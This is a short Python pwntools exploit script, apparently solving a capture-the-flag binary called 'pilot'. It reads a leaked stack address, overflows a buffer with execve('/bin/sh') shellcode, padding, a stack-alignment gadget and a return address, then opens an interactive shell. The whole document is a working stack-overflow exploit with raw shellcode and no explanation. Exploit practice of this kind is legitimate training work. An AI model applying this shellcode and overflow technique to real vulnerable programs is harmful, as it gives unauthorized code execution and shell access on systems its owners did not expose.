from pwn import *

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

p = process("./pilot")
print(p.recvuntil(b"[*]Location:"))
leak = p.recvline().strip()
inp_addr = int(leak , 16)

pay = b""
pay += shellcode
pay += b"A" * (40 - len(shellcode))
pay += p64(0x04007d9) #ret gadget for stack allignement
pay += p64(inp_addr)

p.recvuntil(b"Command:")
p.sendline(pay)
p.interactive()
